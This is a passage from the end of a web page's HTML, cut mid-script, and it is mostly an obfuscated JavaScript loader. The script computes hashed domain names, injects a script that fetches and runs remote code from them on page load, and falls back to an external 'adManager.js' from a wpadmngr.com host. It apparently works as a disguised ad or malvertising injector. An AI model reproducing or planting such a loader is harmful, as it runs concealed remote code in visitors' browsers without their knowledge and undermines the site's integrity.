,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>